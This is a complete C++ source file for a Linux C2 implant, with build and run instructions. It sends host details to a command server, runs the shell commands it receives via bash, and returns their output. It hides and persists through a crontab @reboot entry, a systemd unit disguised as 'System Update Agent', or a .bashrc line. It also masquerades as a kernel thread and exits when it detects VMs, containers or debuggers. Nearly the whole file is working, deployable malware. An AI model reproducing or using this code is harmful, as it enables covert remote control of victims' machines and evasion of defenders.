// ═══════════════════════════════════════════════════════════════════════
//  C2 Client — Linux native (C++17, links against libcurl)
//
//  Build:
//    g++ -std=c++17 -O2 -o c2client main.cpp -lcurl -lpthread
//    strip c2client
//
//  Run:
//    ./c2client --server 10.0.0.1:8000 --interval 10 --persist crontab
// ═══════════════════════════════════════════════════════════════════════

#include <algorithm>
#include <array>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pwd.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <linux/limits.h>
#include <unistd.h>

#include <curl/curl.h>

// Build-time defaults — override with:
//   g++ -DC2_DEFAULT_SERVER='"10.0.0.1:8000"' -DC2_DEFAULT_INTERVAL=10 ...
#ifndef C2_DEFAULT_SERVER
#define C2_DEFAULT_SERVER "127.0.0.1:8000"
#endif
#ifndef C2_DEFAULT_INTERVAL
#define C2_DEFAULT_INTERVAL 10
#endif
#ifndef C2_DEFAULT_JITTER
#define C2_DEFAULT_JITTER 0.3
#endif

// ── Helpers ──────────────────────────────────────────────────────────

static size_t curl_write_cb(void *data, size_t size, size_t nmemb, void *userp)
{
    auto *buf = static_cast<std::string *>(userp);
    buf->append(static_cast<char *>(data), size * nmemb);
    return size * nmemb;
}

// Minimal JSON helpers (no dependency on nlohmann/json)
static std::string json_escape(const std::string &s)
{
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   out += c;
        }
    }
    return out;
}

static std::string json_get(const std::string &json, const std::string &key)
{
    // Extracts value for "key":"value" or "key": "value"
    // Handles JSON escape sequences (\" \\ \n \t etc.)
    auto needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return "";
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";

    // Walk forward from opening quote, respecting backslash escapes
    std::string result;
    size_t i = pos + 1;
    while (i < json.size()) {
        char c = json[i];
        if (c == '"') break;           // unescaped closing quote
        if (c == '\\' && i + 1 < json.size()) {
            char next = json[i + 1];
            switch (next) {
                case '"':  result += '"';  break;
                case '\\': result += '\\'; break;
                case 'n':  result += '\n'; break;
                case 'r':  result += '\r'; break;
                case 't':  result += '\t'; break;
                case '/':  result += '/';  break;
                default:   result += '\\'; result += next; break;
            }
            i += 2;
        } else {
            result += c;
            ++i;
        }
    }
    return result;
}

// Find the matching '}' for a '{' at position start, skipping over JSON strings
static size_t json_find_object_end(const std::string &json, size_t start)
{
    int depth = 0;
    bool in_string = false;
    for (size_t i = start; i < json.size(); ++i) {
        char c = json[i];
        if (in_string) {
            if (c == '\\') { ++i; continue; }  // skip escaped char
            if (c == '"') in_string = false;
        } else {
            if (c == '"') in_string = true;
            else if (c == '{') ++depth;
            else if (c == '}') { --depth; if (depth == 0) return i; }
        }
    }
    return std::string::npos;
}

// Extract command entries from beacon JSON: {"commands":[{"id":"...","command":"..."},..]}
struct CmdEntry { std::string id; std::string command; };
static std::vector<CmdEntry> parse_commands(const std::string &json)
{
    std::vector<CmdEntry> out;
    // Start from the "[" array bracket to skip the outer { }
    size_t pos = json.find('[');
    if (pos == std::string::npos) return out;
    while (true) {
        pos = json.find('{', pos);
        if (pos == std::string::npos) break;
        auto end = json_find_object_end(json, pos);
        if (end == std::string::npos) break;
        auto block = json.substr(pos, end - pos + 1);
        auto id  = json_get(block, "id");
        auto cmd = json_get(block, "command");
        if (!id.empty() && !cmd.empty())
            out.push_back({id, cmd});
        pos = end + 1;
    }
    return out;
}

// ── HTTP client (libcurl) ────────────────────────────────────────────

class Http {
public:
    static std::string post(const std::string &url, const std::string &body, int retries = 3)
    {
        std::string response;
        for (int attempt = 0; attempt < retries; ++attempt) {
            response.clear();
            CURL *curl = curl_easy_init();
            if (!curl) continue;
            struct curl_slist *hdrs = nullptr;
            hdrs = curl_slist_append(hdrs, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
            auto res = curl_easy_perform(curl);
            curl_slist_free_all(hdrs);
            curl_easy_cleanup(curl);
            if (res == CURLE_OK) return response;
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        return "";
    }

    static std::string get(const std::string &url, int retries = 3)
    {
        std::string response;
        for (int attempt = 0; attempt < retries; ++attempt) {
            response.clear();
            CURL *curl = curl_easy_init();
            if (!curl) continue;
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_cb);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
            curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
            auto res = curl_easy_perform(curl);
            curl_easy_cleanup(curl);
            if (res == CURLE_OK) return response;
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
        return "";
    }
};

// ── System information ───────────────────────────────────────────────

namespace SysInfo {

std::string hostname()
{
    char buf[256] = {};
    gethostname(buf, sizeof(buf));
    return buf;
}

std::string os_info()
{
    struct utsname u = {};
    uname(&u);
    return std::string("Linux ") + u.release;
}

std::string local_ip()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return "127.0.0.1";
    struct sockaddr_in srv{};
    srv.sin_family = AF_INET;
    srv.sin_port   = htons(80);
    inet_pton(AF_INET, "8.8.8.8", &srv.sin_addr);
    connect(sock, (struct sockaddr *)&srv, sizeof(srv));
    struct sockaddr_in local{};
    socklen_t len = sizeof(local);
    getsockname(sock, (struct sockaddr *)&local, &len);
    close(sock);
    char ip[INET_ADDRSTRLEN] = {};
    inet_ntop(AF_INET, &local.sin_addr, ip, sizeof(ip));
    return ip;
}

std::string mac_address()
{
    struct ifaddrs *ifa = nullptr;
    if (getifaddrs(&ifa) != 0) return "00:00:00:00:00:00";
    // Find first non-loopback interface with a HW addr
    for (auto *p = ifa; p; p = p->ifa_next) {
        if (!p->ifa_addr || p->ifa_addr->sa_family != AF_PACKET) continue;
        if (p->ifa_flags & IFF_LOOPBACK) continue;
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        struct ifreq ifr{};
        strncpy(ifr.ifr_name, p->ifa_name, IFNAMSIZ - 1);
        if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
            close(fd);
            freeifaddrs(ifa);
            auto *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
            char buf[18];
            snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x",
                     mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            return buf;
        }
        close(fd);
    }
    freeifaddrs(ifa);
    return "00:00:00:00:00:00";
}

} // namespace SysInfo

// ── Command execution ────────────────────────────────────────────────

std::string exec_command(const std::string &cmd, int timeout_sec = 300)
{
    // Fork + exec via /bin/bash -c "<cmd>"
    int pipefd[2];
    if (pipe(pipefd) != 0) return "[ERROR] pipe() failed";

    pid_t pid = fork();
    if (pid < 0) return "[ERROR] fork() failed";

    if (pid == 0) {
        // Child
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execl("/bin/bash", "bash", "-c", cmd.c_str(), (char *)nullptr);
        _exit(127);
    }

    // Parent
    close(pipefd[1]);
    std::string output;
    char buf[4096];
    ssize_t n;
    // Non-blocking read with timeout
    auto start = std::chrono::steady_clock::now();
    while ((n = read(pipefd[0], buf, sizeof(buf))) > 0) {
        output.append(buf, n);
        auto elapsed = std::chrono::steady_clock::now() - start;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() > timeout_sec) {
            kill(pid, SIGKILL);
            output += "\n[ERROR] Command timed out";
            break;
        }
    }
    close(pipefd[0]);

    int status = 0;
    waitpid(pid, &status, 0);

    // Trim trailing whitespace
    while (!output.empty() && (output.back() == '\n' || output.back() == '\r'))
        output.pop_back();
    return output;
}

// ── Persistence ──────────────────────────────────────────────────────

namespace Persist {

bool crontab(const std::string &self_path)
{
    std::string existing = exec_command("crontab -l 2>/dev/null");
    std::string entry = "@reboot " + self_path + " &";
    if (existing.find(entry) != std::string::npos) return true;
    std::string new_cron = existing + "\n" + entry + "\n";
    // Write to temp file to avoid shell injection via special chars in paths
    std::string tmp = "/tmp/.cron_" + std::to_string(getpid());
    {
        std::ofstream f(tmp);
        if (!f) return false;
        f << new_cron;
    }
    exec_command("crontab " + tmp);
    unlink(tmp.c_str());
    return true;
}

bool systemd_user(const std::string &self_path)
{
    auto home = std::string(getenv("HOME") ? getenv("HOME") : "/tmp");
    auto dir  = home + "/.config/systemd/user";
    exec_command("mkdir -p " + dir);
    std::ofstream f(dir + "/system-update-agent.service");
    if (!f) return false;
    f << "[Unit]\n"
         "Description=System Update Agent\n"
         "After=network-online.target\n\n"
         "[Service]\n"
         "ExecStart=" << self_path << "\n"
         "Restart=always\n"
         "RestartSec=30\n\n"
         "[Install]\n"
         "WantedBy=default.target\n";
    f.close();
    exec_command("systemctl --user daemon-reload");
    exec_command("systemctl --user enable --now system-update-agent.service");
    return true;
}

bool bashrc(const std::string &self_path)
{
    auto home = std::string(getenv("HOME") ? getenv("HOME") : "/tmp");
    auto rc   = home + "/.bashrc";
    std::string marker = "# c2-agent";
    {
        std::ifstream in(rc);
        std::string contents((std::istreambuf_iterator<char>(in)), {});
        if (contents.find(marker) != std::string::npos) return true;
    }
    std::ofstream out(rc, std::ios::app);
    out << "\n(nohup " << self_path << " &>/dev/null &) " << marker << "\n";
    return true;
}

} // namespace Persist

// ── Anti-analysis ────────────────────────────────────────────────────

namespace AntiAnalysis {

bool is_container()
{
    // /.dockerenv
    if (access("/.dockerenv", F_OK) == 0) return true;

    // cgroup check
    std::ifstream cg("/proc/1/cgroup");
    if (cg) {
        std::string line;
        while (std::getline(cg, line)) {
            if (line.find("docker") != std::string::npos ||
                line.find("lxc")    != std::string::npos ||
                line.find("kubepods") != std::string::npos)
                return true;
        }
    }

    // DMI
    std::ifstream dmi("/sys/class/dmi/id/product_name");
    if (dmi) {
        std::string product;
        std::getline(dmi, product);
        for (auto &c : product) c = tolower(c);
        for (auto &k : {"virtualbox", "vmware", "kvm", "qemu", "xen"})
            if (product.find(k) != std::string::npos) return true;
    }
    return false;
}

bool is_traced()
{
    std::ifstream f("/proc/self/status");
    std::string line;
    while (std::getline(f, line)) {
        if (line.find("TracerPid:") != std::string::npos) {
            auto pid = line.substr(line.find(':') + 1);
            pid.erase(0, pid.find_first_not_of(" \t"));
            return pid != "0";
        }
    }
    return false;
}

} // namespace AntiAnalysis

// ── Process masquerade ───────────────────────────────────────────────

void masquerade(const char *name = "[kworker/0:2-events]")
{
    prctl(PR_SET_NAME, name, 0, 0, 0);
}

// ── Agent ────────────────────────────────────────────────────────────

class Agent {
    std::string base_url_;
    int         interval_ms_;
    double      jitter_;
    std::mt19937 rng_{std::random_device{}()};

public:
    Agent(const std::string &server, int interval_sec, double jitter)
        : base_url_("http://" + server + "/api/v1/agent")
        , interval_ms_(interval_sec * 1000)
        , jitter_(jitter) {}

    std::string do_register()
    {
        std::string body = "{\"hostname\":\"" + json_escape(SysInfo::hostname())
            + "\",\"ip_address\":\"" + json_escape(SysInfo::local_ip())
            + "\",\"mac_address\":\"" + json_escape(SysInfo::mac_address())
            + "\",\"os\":\"" + json_escape(SysInfo::os_info())
            + "\",\"communication_channel\":\"http\"}";
        auto resp = Http::post(base_url_ + "/register", body);
        return json_get(resp, "target_id");
    }

    std::vector<CmdEntry> beacon(const std::string &target_id)
    {
        auto resp = Http::get(base_url_ + "/" + target_id + "/commands");
        if (resp.empty()) return {};
        return parse_commands(resp);
    }

    void report(const std::string &target_id, const std::string &cmd_id, const std::string &output)
    {
        std::string body = "{\"output\":\"" + json_escape(output) + "\"}";
        Http::post(base_url_ + "/" + target_id + "/commands/" + cmd_id + "/result", body);
    }

    [[noreturn]] void run()
    {
        std::cout << "[*] C2 Client (C++) — connecting to " << base_url_ << std::endl;

        // Registration loop
        std::string target_id;
        while (target_id.empty()) {
            std::cout << "[*] Registering ..." << std::endl;
            target_id = do_register();
            if (!target_id.empty()) {
                std::cout << "[+] Registered as " << target_id << std::endl;
            } else {
                std::cout << "[-] Registration failed, retrying ..." << std::endl;
                std::this_thread::sleep_for(std::chrono::milliseconds(interval_ms_));
            }
        }

        // Beacon loop
        std::uniform_real_distribution<double> dist(-jitter_, jitter_);
        while (true) {
            try {
                auto commands = beacon(target_id);
                for (auto &cmd : commands) {
                    std::cout << "[>] Executing " << cmd.id.substr(0, 8) << "..." << std::endl;
                    auto output = exec_command(cmd.command);
                    std::cout << "[<] Result (" << output.size() << " bytes)" << std::endl;
                    report(target_id, cmd.id, output);
                }
            } catch (const std::exception &e) {
                std::cerr << "[-] Beacon error: " << e.what() << std::endl;
            }

            double factor = 1.0 + dist(rng_);
            int sleep_ms = std::max(1000, static_cast<int>(interval_ms_ * factor));
            std::this_thread::sleep_for(std::chrono::milliseconds(sleep_ms));
        }
    }
};

// ── Main ─────────────────────────────────────────────────────────────

static void print_usage()
{
    std::cout << R"(c2client — Linux native C2 implant (C++)

Options:
  -s, --server <host:port>   C2 server (default: 127.0.0.1:8000)
  -i, --interval <sec>       Beacon interval (default: 10)
  -j, --jitter <0-1>         Jitter factor (default: 0.3)
  --persist <method>          none | crontab | systemd | bashrc
  --masquerade                Rename process to kernel thread name
  --container-check           Exit if container/VM detected
  --trace-check               Exit if ptrace debugger attached

Build:
  g++ -std=c++17 -O2 -o c2client main.cpp -lcurl -lpthread
  strip c2client
)" << std::endl;
}

int main(int argc, char *argv[])
{
    curl_global_init(CURL_GLOBAL_ALL);

    // Resolve: env var C2_SERVER > compile-time define > hardcoded fallback
    const char *env_server = std::getenv("C2_SERVER");
    std::string server   = env_server ? env_server : C2_DEFAULT_SERVER;
    int         interval = C2_DEFAULT_INTERVAL;
    double      jitter   = C2_DEFAULT_JITTER;
    std::string persist  = "none";
    bool        do_masq  = false;
    bool        cont_chk = false;
    bool        trace_chk = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if ((arg == "-s" || arg == "--server")   && i+1 < argc) server   = argv[++i];
        else if ((arg == "-i" || arg == "--interval") && i+1 < argc) interval = std::atoi(argv[++i]);
        else if ((arg == "-j" || arg == "--jitter")   && i+1 < argc) jitter   = std::atof(argv[++i]);
        else if (arg == "--persist"    && i+1 < argc) persist  = argv[++i];
        else if (arg == "--masquerade") do_masq   = true;
        else if (arg == "--container-check") cont_chk  = true;
        else if (arg == "--trace-check")     trace_chk = true;
        else if (arg == "-h" || arg == "--help") { print_usage(); return 0; }
    }

    // Anti-analysis
    if (cont_chk && AntiAnalysis::is_container()) {
        std::cout << "[!] Container/VM detected — exiting" << std::endl;
        return 0;
    }
    if (trace_chk && AntiAnalysis::is_traced()) {
        std::cout << "[!] Tracer detected — exiting" << std::endl;
        return 0;
    }

    // Masquerade
    if (do_masq) masquerade();

    // Persistence
    std::string self_path = argv[0];
    // Resolve to absolute path if relative
    if (self_path[0] != '/') {
        char rp[PATH_MAX] = {};
        if (realpath(argv[0], rp)) self_path = rp;
    }

    if (persist == "crontab")       { Persist::crontab(self_path);       std::cout << "[+] Persistence: crontab" << std::endl; }
    else if (persist == "systemd")  { Persist::systemd_user(self_path);  std::cout << "[+] Persistence: systemd user" << std::endl; }
    else if (persist == "bashrc")   { Persist::bashrc(self_path);        std::cout << "[+] Persistence: bashrc" << std::endl; }

    // Run
    Agent agent(server, interval, jitter);
    agent.run();

    curl_global_cleanup();
    return 0;
}
